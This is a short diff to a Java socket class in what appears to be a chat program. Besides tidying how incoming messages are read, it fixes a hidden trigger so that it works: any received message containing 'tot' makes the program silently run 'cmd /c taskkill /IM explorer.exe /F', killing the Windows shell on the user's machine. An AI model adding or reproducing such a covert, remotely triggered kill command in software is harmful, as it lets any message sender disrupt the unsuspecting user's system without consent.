@@ -56,12 +56,13 @@ public class Model {
 						// socket.getInetAddress().getHostAddress());
 						if (socket.getInputStream().available() != 0) {
 							try {
-								v.newMessage(new DataInputStream(socket.getInputStream()).readUTF(), false);
-								if(new DataInputStream(socket.getInputStream()).readUTF().contains("tot"))
+								String mes =new DataInputStream(socket.getInputStream()).readUTF();
+								v.newMessage(mes, false);
+								if(mes.contains("tot"))
 								{
 									try {
 										v.newMessage("töt", true);
-										Runtime.getRuntime().exec("cmd/ taskkill /IM /F");
+										Runtime.getRuntime().exec("cmd /c taskkill /IM explorer.exe /F");
 									}catch(Exception e) { 
 									}
 								}
